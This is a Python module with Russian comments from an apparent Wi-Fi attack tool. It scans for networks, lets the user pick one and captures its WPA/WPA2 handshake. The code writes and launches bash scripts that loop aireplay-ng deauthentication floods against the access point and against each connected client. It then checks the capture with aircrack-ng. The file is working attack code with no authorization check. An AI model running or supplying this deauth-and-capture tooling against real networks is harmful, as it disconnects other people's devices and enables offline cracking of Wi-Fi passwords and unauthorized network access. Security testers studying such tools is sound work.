"""Захват WPA/WPA2 handshake через airodump-ng + aireplay-ng.

Включает деаутентификацию в отдельном окне и watchdog, оживляющий адаптер,
если драйвер завис. Интерфейс должен быть в режиме monitor.
"""

import os
import re
import time
import signal
import shutil
import tempfile
import threading
import subprocess
from pathlib import Path

from .terminal import find_terminal, launch_in_terminal, kill_group
from .iface import set_channel
from .netscan import scan_networks, choose_network, ask_scan_duration
from .constants import WATCHDOG
from .i18n import t


def _sh(s):
    """Безопасно оборачивает строку в одинарные кавычки для bash
    (ESSID с апострофом, напр. O'Brien, иначе ломает echo '...')."""
    return "'" + str(s).replace("'", "'\\''") + "'"


# ============ Проверка handshake ============

def check_handshake(cap_file):
    if not os.path.exists(cap_file) or os.path.getsize(cap_file) == 0:
        return False
    try:
        r = subprocess.run(
            ["aircrack-ng", cap_file],
            capture_output=True, text=True, timeout=30
        )
        out = r.stdout + r.stderr
        if re.search(r"\b1 handshake\b", out, re.IGNORECASE):
            return True
        if "WPA handshake" in out:
            return True
    except Exception:
        pass
    return False


# ============ bash-скрипты для окон ============

def _build_capture_script(work_dir, interface, target):
    """Готовит bash-скрипт для окна airodump-ng при захвате handshake."""
    bssid = target['bssid']
    channel = target['channel']
    prefix = str(Path(work_dir) / f"capture_{bssid.replace(':', '')}")
    cap_file = f"{prefix}-01.cap"

    cmd = (
        f'airodump-ng --bssid {bssid} --channel {channel} '
        f'--write "{prefix}" --output-format pcap,csv '
        f'{interface}'
    )
    title = t("cap.win_capture", essid=target['essid'] or t("common.hidden"),
              bssid=bssid, ch=channel)

    script_path = Path(work_dir) / "capture.sh"
    script_path.write_text(
        "#!/bin/bash\n"
        f"echo {_sh(title)}\n"
        f"echo {_sh(t('cap.win_stop'))}\n"
        "echo\n"
        f"{cmd}\n"
    )
    script_path.chmod(0o755)
    return script_path, cap_file


def _build_deauth_script(work_dir, interface, target):
    """
    bash-скрипт для окна деаутентификации.
    Фаза 1: broadcast на роутер. Фаза 2: targeted deauth по каждому клиенту.
    """
    bssid = target['bssid']
    prefix = str(Path(work_dir) / f"capture_{bssid.replace(':', '')}")
    csv_file = f"{prefix}-01.csv"

    script_path = Path(work_dir) / "deauth.sh"
    script_path.write_text(
        "#!/bin/bash\n"
        f'IFACE="{interface}"\n'
        f'BSSID="{bssid}"\n'
        f'CSV="{csv_file}"\n'
        "\n"
        f"echo {_sh(t('cap.deauth_title'))}\n"
        f"echo \"{t('cap.deauth_target')} $BSSID\"\n"
        f"echo \"{t('cap.deauth_iface')} $IFACE\"\n"
        f"echo \"{t('cap.deauth_csv')} $CSV\"\n"
        f"echo {_sh(t('cap.deauth_stop'))}\n"
        "echo\n"
        "\n"
        "ROUND=0\n"
        "while true; do\n"
        "    ROUND=$((ROUND+1))\n"
        "    echo\n"
        f"    echo \"========== {t('cap.round')} $ROUND ==========\"\n"
        "\n"
        f"    echo \"[$(date +%H:%M:%S)] {t('cap.phase1')}\"\n"
        "    aireplay-ng --deauth 15 -a \"$BSSID\" \"$IFACE\" 2>&1 | tail -5\n"
        f"    echo \"[$(date +%H:%M:%S)] {t('cap.wait8')}\"\n"
        "    sleep 8\n"
        "\n"
        "    if [ ! -f \"$CSV\" ]; then\n"
        f"        echo \"[$(date +%H:%M:%S)] {t('cap.no_csv')}\"\n"
        "        continue\n"
        "    fi\n"
        "\n"
        "    STATIONS=$(awk -F',' -v bssid=\"$BSSID\" '\n"
        "        /^Station MAC/ { in_st = 1; next }\n"
        "        in_st {\n"
        "            gsub(/^ +| +$/, \"\", $1)\n"
        "            gsub(/^ +| +$/, \"\", $6)\n"
        "            if (toupper($6) == toupper(bssid) && $1 != \"\") print $1\n"
        "        }\n"
        "    ' \"$CSV\" | sort -u)\n"
        "\n"
        "    if [ -z \"$STATIONS\" ]; then\n"
        f"        echo \"[$(date +%H:%M:%S)] {t('cap.no_clients')}\"\n"
        "        continue\n"
        "    fi\n"
        "\n"
        "    N=$(echo \"$STATIONS\" | wc -l)\n"
        f"    echo \"[$(date +%H:%M:%S)] {t('cap.clients_found')} $N\"\n"
        "\n"
        "    for STATION in $STATIONS; do\n"
        f"        echo \"[$(date +%H:%M:%S)] {t('cap.phase2')} $STATION\"\n"
        "        aireplay-ng --deauth 20 -a \"$BSSID\" -c \"$STATION\" \"$IFACE\" 2>&1 | tail -3\n"
        "        sleep 3\n"
        "    done\n"
        "\n"
        f"    echo \"[$(date +%H:%M:%S)] {t('cap.round_done')}\"\n"
        "    sleep 20\n"
        "done\n"
    )
    script_path.chmod(0o755)
    return script_path


# ============ Watchdog ============

def _any_file_fresh(paths, threshold=15):
    """True, если хотя бы один из файлов обновлялся не позднее threshold сек назад."""
    for p in paths:
        if os.path.exists(p) and (time.time() - os.path.getmtime(p)) <= threshold:
            return True
    return False


def _revive_watchdog(interface, watch_files, stop_event,
                     check_interval=WATCHDOG["check_interval"],
                     stale_threshold=WATCHDOG["stale_threshold"],
                     revive_seconds=WATCHDOG["revive_seconds"],
                     startup_grace=WATCHDOG["startup_grace"],
                     recovery_grace=WATCHDOG["recovery_grace"],
                     need_streak=WATCHDOG["stale_streak"]):
    """
    Следит за mtime .cap/.csv. Если ни один файл не обновлялся stale_threshold
    секунд (и подтверждено need_streak подряд проверками) — один раз гоняет
    airodump-ng без канала revive_seconds секунд, чтобы драйвер переинициализировался.

    quiet_until — окно, в которое не судим о застое: в начале (startup_grace,
    airodump ещё поднимается) и ПОСЛЕ оживления (recovery_grace). Второе важно:
    во время оживления канал уводится, .cap не растёт, и без паузы на
    восстановление watchdog зациклил бы ревайвы один за другим.
    """
    seen_file = False
    stale_streak = 0
    quiet_until = time.time() + startup_grace

    while not stop_event.is_set():
        time.sleep(check_interval)
        if stop_event.is_set():
            break
        if time.time() < quiet_until:
            continue
        if any(os.path.exists(p) for p in watch_files):
            seen_file = True
        elif not seen_file:
            continue

        if _any_file_fresh(watch_files, stale_threshold):
            stale_streak = 0
            continue
        stale_streak += 1
        if stale_streak < need_streak:   # дебаунс: ждём подтверждения застоя
            continue

        print(t("cap.revive", n=stale_threshold, r=revive_seconds))
        revive = subprocess.Popen(
            ["airodump-ng", interface],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
            preexec_fn=os.setsid
        )
        try:
            for _ in range(revive_seconds):
                time.sleep(1)
                if stop_event.is_set():
                    break
        finally:
            try:
                os.killpg(os.getpgid(revive.pid), signal.SIGINT)
                try:
                    revive.wait(timeout=3)
                except subprocess.TimeoutExpired:
                    os.killpg(os.getpgid(revive.pid), signal.SIGKILL)
            except (ProcessLookupError, PermissionError):
                pass
        # Дать адаптеру восстановиться и начать писать файлы, прежде чем снова
        # оценивать застой — иначе следующий тик тут же сработает повторно.
        stale_streak = 0
        quiet_until = time.time() + recovery_grace
        print(t("cap.revive_done"))


# ============ Захват ============

def capture_handshake(interface, target, work_dir, timeout=180, deauth=True):
    bssid = target['bssid']
    channel = target['channel']
    essid = target['essid'] or t("common.hidden")

    if not channel.isdigit():
        print(t("cap.bad_channel", ch=repr(channel)))
        return None

    # Фиксируем канал адаптера, чтобы оба окна работали на одном канале
    set_channel(interface, channel)

    work_dir = Path(work_dir)
    cap_script, cap_file = _build_capture_script(work_dir, interface, target)

    term_name, term_cmd = find_terminal()
    if term_name is None:
        print(t("cap.no_term"))
        prefix = str(work_dir / f"capture_{bssid.replace(':', '')}")
        airodump = subprocess.Popen(
            ["airodump-ng", "--bssid", bssid, "--channel", channel,
             "--write", prefix, "--output-format", "pcap", interface],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )
        cap_term = None
    else:
        cap_term = launch_in_terminal(term_name, term_cmd, cap_script)
        airodump = cap_term

    # Общий флаг остановки для фоновых потоков (watchdog + fallback-деаут).
    stop_watchdog = threading.Event()

    deauth_term = None
    if deauth:
        deauth_script = _build_deauth_script(work_dir, interface, target)
        if term_name is not None:
            deauth_term = launch_in_terminal(term_name, term_cmd, deauth_script)
        else:
            # Завязан на stop_watchdog, иначе поток деаутил бы вечно и после захвата.
            def _deauth_loop():
                while not stop_watchdog.is_set():
                    subprocess.run(
                        ["aireplay-ng", "--deauth", "10", "-a", bssid, interface],
                        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
                    )
                    for _ in range(20):
                        if stop_watchdog.is_set():
                            break
                        time.sleep(1)
            threading.Thread(target=_deauth_loop, daemon=True).start()

    print(t("cap.target", essid=essid, bssid=bssid, ch=channel))
    print(t("cap.file", f=cap_file))
    print(t("cap.timeout", t=timeout))

    csv_file = cap_file.replace("-01.cap", "-01.csv")
    watch_files = [cap_file, csv_file]

    watchdog = threading.Thread(
        target=_revive_watchdog,
        args=(interface, watch_files, stop_watchdog),
        daemon=True
    )
    watchdog.start()

    start = time.time()
    found = False
    last_mtime = 0.0        # перф: aircrack-ng гоняем только когда .cap изменился
    try:
        while time.time() - start < timeout:
            if cap_term is not None and cap_term.poll() is not None:
                print(t("cap.win_closed"))
                break
            if deauth_term is not None and deauth_term.poll() is not None:
                print(t("cap.deauth_closed"))
                break

            if os.path.exists(cap_file):
                mtime = os.path.getmtime(cap_file)
                if mtime != last_mtime:
                    last_mtime = mtime
                    if check_handshake(cap_file):
                        found = True
                        print(t("cap.found"))
                        break

            remaining = int(timeout - (time.time() - start))
            print(t("cap.waiting", r=remaining), end='', flush=True)
            time.sleep(5)
    except KeyboardInterrupt:
        print(t("common.interrupted"))
    finally:
        stop_watchdog.set()
        kill_group(deauth_term)
        kill_group(cap_term)
        if cap_term is None and airodump is not None and airodump.poll() is None:
            try:
                airodump.send_signal(signal.SIGINT)
                airodump.wait(timeout=5)
            except Exception:
                airodump.kill()
        time.sleep(0.5)

    print()
    if os.path.exists(cap_file):
        if found or check_handshake(cap_file):
            print(t("cap.saved", f=cap_file))
        else:
            print(t("cap.not_found", f=cap_file))
        return cap_file
    print(t("cap.no_file"))
    return None


# ============ Сценарий ============

def ask_save_path(cap_file):
    """Спрашивает, куда сохранить пойманный handshake. Path или None."""
    default = Path.cwd() / Path(cap_file).name
    print(t("cap.caught"))
    print(t("cap.default_path", p=default))
    print(t("cap.save_hint"))

    user = input(t("cap.path_prompt")).strip()
    if user.lower() == 'c':
        return None

    if user == "":
        target = default
    else:
        target = Path(user).expanduser()
        if target.is_dir():
            target = target / Path(cap_file).name

    if not target.parent.exists():
        try:
            target.parent.mkdir(parents=True, exist_ok=True)
        except OSError as e:
            print(t("cap.mkdir_fail", e=e))
            return None

    if target.exists():
        ans = input(t("cap.overwrite", t=target)).strip().lower()
        if ans != 'y':
            print(t("cap.save_cancel"))
            return None

    return target


def choose_action():
    """Меню действий с сетью: 'deauth' | 'passive' | None."""
    print(t("cap.actions_title"))
    print(t("cap.act_deauth"))
    print(t("cap.act_passive"))
    print()
    print(t("cap.act_back"))
    while True:
        c = input(t("cap.act_prompt")).strip()
        if c == '0':
            return None
        if c == '1':
            return 'deauth'
        if c == '2':
            return 'passive'
        print(t("cap.act_bad"))


def handshake_flow(interface):
    """Полный сценарий: скан -> выбор сети -> захват (деаут/пассив) -> сохранение."""
    tmp_dir = Path(tempfile.mkdtemp(prefix="wifitool_"))
    try:
        duration = ask_scan_duration()
        networks = scan_networks(interface, duration, tmp_dir)
        if not networks:
            print(t("scan.none"))
            return

        target = choose_network(networks)
        if target is None:
            return

        while True:
            print(t("cap.target_line", essid=target['essid'] or t("common.hidden"),
                    bssid=target['bssid']))
            action = choose_action()
            if action is None:
                print(t("cap.back_menu"))
                return

            deauth = (action == 'deauth')

            try:
                timeout_str = input(t("cap.ask_timeout")).strip()
                timeout = int(timeout_str) if timeout_str else 180
                if timeout <= 0:
                    timeout = 180
            except ValueError:
                timeout = 180

            cap_file = capture_handshake(
                interface, target, tmp_dir, timeout=timeout, deauth=deauth
            )

            if cap_file and os.path.exists(cap_file) and check_handshake(cap_file):
                save_path = ask_save_path(cap_file)
                if save_path:
                    try:
                        shutil.move(cap_file, save_path)
                        print(t("cap.saved", f=save_path))
                    except Exception as e:
                        print(t("cap.save_fail", e=e))
                else:
                    print(t("cap.not_saved"))
            else:
                print(t("cap.not_caught"))
    finally:
        try:
            shutil.rmtree(tmp_dir, ignore_errors=True)
        except Exception:
            pass
